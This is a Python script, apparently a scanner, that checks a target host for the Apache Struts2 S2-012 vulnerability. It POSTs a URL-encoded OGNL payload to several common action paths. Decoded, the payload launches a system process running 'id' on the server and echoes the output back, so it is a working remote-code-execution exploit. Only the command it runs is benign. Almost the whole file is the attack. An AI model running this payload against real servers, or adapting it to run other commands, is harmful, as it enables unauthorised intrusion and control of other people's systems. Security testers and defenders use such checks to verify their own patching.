try:
    import requests,sys,os,logging,queue
except:
    os._exit(6)

logging.basicConfig(level=logging.INFO,format='%(message)s')
class VulTest:
    def __init__(self, url,port):
        dirs = ['/Simple!addInput.action','/Simple.action','/addUser.action','/listUser.action','/helloworld.action','/user.action']
        self.queues = queue.Queue(len(dirs))
        if '://' not in url:
            self.ip = url
            for dir in dirs:
                urls = 'http://' + url+":"+port+dir
                self.queues.put(urls)



    def Test(self):
        while not self.queues.empty():
            url = self.queues.get(False)
            headers={
                        "Host": self.ip,
                    "Content-Length": "577",
                    "Cache-Control": "max-age=0",
                    "sec-ch-ua": '''" Not A;Brand";v="99", "Chromium";v="96"''',
                    "sec-ch-ua-mobile": '''?0''',
                    "sec-ch-ua-platform": '''"Linux"''',
                    "Upgrade-Insecure-Requests": '''1''',
                    "Origin": url,
                    "Content-Type": '''application/x-www-form-urlencoded''',
                    "User-Agent": '''Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36''',
                    "Accept": '''text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9''',
                    "Referer": url
            }
            data='''name=%25%7b%23%61%3d%28%6e%65%77%20%6a%61%76%61%2e%6c%61%6e%67%2e%50%72%6f%63%65%73%73%42%75%69%6c%64%65%72%28%6e%65%77%20%6a%61%76%61%2e%6c%61%6e%67%2e%53%74%72%69%6e%67%5b%5d%7b%22%69%64%22%7d%29%29%2e%72%65%64%69%72%65%63%74%45%72%72%6f%72%53%74%72%65%61%6d%28%74%72%75%65%29%2e%73%74%61%72%74%28%29%2c%23%62%3d%23%61%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%2c%23%63%3d%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%49%6e%70%75%74%53%74%72%65%61%6d%52%65%61%64%65%72%28%23%62%29%2c%23%64%3d%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%42%75%66%66%65%72%65%64%52%65%61%64%65%72%28%23%63%29%2c%23%65%3d%6e%65%77%20%63%68%61%72%5b%35%30%30%30%30%5d%2c%23%64%2e%72%65%61%64%28%23%65%29%2c%23%66%3d%23%63%6f%6e%74%65%78%74%2e%67%65%74%28%22%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%64%69%73%70%61%74%63%68%65%72%2e%48%74%74%70%53%65%72%76%6c%65%74%52%65%73%70%6f%6e%73%65%22%29%2c%23%66%2e%67%65%74%57%72%69%74%65%72%28%29%2e%70%72%69%6e%74%6c%6e%28%6e%65%77%20%6a%61%76%61%2e%6c%61%6e%67%2e%53%74%72%69%6e%67%28%23%65%29%29%2c%23%66%2e%67%65%74%57%72%69%74%65%72%28%29%2e%66%6c%75%73%68%28%29%2c%23%66%2e%67%65%74%57%72%69%74%65%72%28%29%2e%63%6c%6f%73%65%28%29%7d'''
            # print(url)
            try:
                req = requests.get(url)
                req = requests.post(url , data=data, headers=headers,timeout=3)
            
                #print req.text
                if ('uid' in req.text):
                    logging.info('[+] Found S2-012 in ' + self.ip)
                    os._exit(1)
            except Exception as e:
                logging.info("[-] time out")
                os._exit(4)
        logging.info('[-] S2-012 Not Found in ' + self.ip)
        os._exit(2)


if __name__ == '__main__':
    url = sys.argv[1]
    port = sys.argv[2]
    #url = '192.168.136.130'
    test = VulTest(url,port)
    try:
        test.Test()
    except:
        os._exit(3)
    

